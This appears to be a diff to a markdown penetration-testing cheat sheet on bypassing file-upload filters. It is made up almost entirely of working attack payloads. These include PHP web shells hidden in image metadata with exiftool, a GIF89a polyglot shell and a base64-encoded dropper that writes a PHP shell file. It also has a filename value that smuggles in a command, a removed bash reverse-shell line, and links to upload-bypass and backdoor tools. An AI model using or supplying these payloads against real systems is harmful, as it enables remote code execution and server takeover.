@@ -736,7 +736,11 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 >[sheif ](https://cyberchef.io/)
 >
 >[github waf](https://github.com/0xInfection/Awesome-WAF)
->
+
+
+
+
+
 # shellupload
 [automatic shell upload](https://github.com/sAjibuu/Upload_Bypass)
 >and more upload information
@@ -845,7 +849,7 @@ test.jpg%0Asleep 10
 ```
 
 # Reverse Shell
-test.jpg;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
 >metadata:
 ```
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
@@ -853,6 +857,7 @@ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __h
 >photo make size
 ```
 convert -size 32x32 xc:white test.jpg
+
 ```
 >more example
 ```
@@ -883,6 +888,12 @@ Content-Type: application/x-php
 ```
 GIF89a; <?php system($_GET['cmd']); ?>
 ```
+--
+>shell and lfi to rce
+```
+<?php $a = base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4='); $file = fopen('a.php','w'); echo fwrite($file,$a); fclose($file); ?>
+```
+-
 # shell wget 
 -
 -[shell](https://github.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor)
